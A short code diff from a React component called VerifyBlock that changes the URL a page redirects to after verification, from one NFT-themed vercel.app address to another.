@@ -63,7 +63,7 @@ export const VerifyBlock = () => {
       setVerified(true);
 
       // ✅ Redirecionamento adicionado aqui:
-      window.location.href = "https://nft-bnb-20250527.vercel.app/";
+      window.location.href = "https://world-ver-nft.vercel.app/";
 
       //setTimeout(() => {
      //   window.location.href = "https://nft-bnb-20250527.vercel.app/";
